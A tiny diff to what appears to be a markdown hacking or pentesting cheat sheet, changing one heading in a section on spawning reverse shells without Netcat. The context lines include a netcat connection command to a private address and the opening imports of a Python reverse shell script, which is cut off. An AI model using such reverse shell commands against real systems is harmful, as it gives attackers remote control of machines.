@@ -370,7 +370,7 @@ nc 192.168.1.101 5000
 ```
 
 ## 3.6. Spawn a reverse shell without Netcat
-### Python Reverse Shell Script:
+### Python Reverse Shell skripts:
 ```
 import socket
 import subprocess
